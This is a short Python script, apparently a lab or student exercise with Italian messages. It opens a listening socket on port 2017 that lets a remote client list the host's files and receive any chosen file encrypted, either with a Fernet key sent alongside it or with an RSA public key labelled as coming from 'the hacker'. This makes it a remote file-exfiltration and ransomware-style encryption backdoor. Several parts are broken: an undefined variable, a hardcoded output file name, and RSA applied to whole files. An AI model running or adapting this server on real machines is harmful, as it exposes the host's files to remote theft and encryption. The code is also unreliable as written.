import socket
import os
from cryptography.fernet import Fernet
import rsa

HOST = ''
PORT = 2017

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)

while 1:
    print("Ready for a new connection!")
    conn, addr = s.accept()
    print('Connected by', addr)

    while 1:
        data = conn.recv(1024)
        if not data : break
        datastringa = data.decode()

        if datastringa == "ELENCO":
            lista = os.listdir(".")
            conn.send(str(lista).encode())

        if datastringa == "CIFRA SIMMETRICA":
            nomefile = conn.recv(1024)
            filename = nomefile.decode()
            print("il nome del file è:", filename)

            index = lista.index(filename)
            print("la posizione del file nell'elenco è:", str(index))

            filedacifrare = lista[index]
            print("il file da cifrare è:", filedacifrare)

            key = Fernet.generate_key()
            fernet = Fernet(key)

            f = open(filedacifrare, "rb")
            message = f.read()
            encMessage = fernet.encrypt(message)
            encFileName = "enc" + "ciaomondo.rtf"

            f = open(encFileName, "wb")
            f.write(encMessage)
            f.close()

            conn.send(key)
            conn.send(encMessage)

        if datastringa == "CIFRA ASIMMETRICA":
            nomefile = conn.recv(1024)
            filename = nomefile.decode()
            print("il nome del file è:", filename)

            index = lista.index(filename)
            print("la posizione del file nell'elenco è:", str(index))

            filedacifrare = lista[index]
            print("il file da cifrare è:", filedacifrare)

            f = open(filedacifrare, "rb")
            message = f.read()
            f.close()

            public_key = conn.recv(512)
            print("La chiave pubblica che ricevo dall'hacker è:", public_key.decode())

            chiave_pubblica = rsa.PublicKey.load_pkcs1(public_key,
                                                       format='PEM')
            encMessage = rsa.encrypt(message, chiave_pubblica)
            print("Il messaggio cifrato con la chiave pubblica è:", encMessage)
            conn.send(encMessage)
